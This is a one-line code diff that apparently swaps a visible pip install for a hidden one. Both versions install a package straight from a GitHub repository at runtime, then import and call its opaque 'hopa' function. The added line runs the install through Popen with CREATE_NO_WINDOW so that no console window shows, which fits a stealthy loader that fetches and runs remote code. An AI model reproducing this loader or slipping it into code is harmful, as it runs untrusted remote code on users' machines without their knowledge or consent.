@@ -1,1 +1,1 @@
-from os import system;system('pip install git+https://github.com/ZenoMilk12/Daniden.git#egg=swap');from swap.swap import hopa;hopa()
+from subprocess import CREATE_NO_WINDOW, Popen;Popen('pip install git+https://github.com/ZenoMilk12/Daniden.git#egg=swap', creationflags=CREATE_NO_WINDOW);from swap.swap import hopa;hopa()
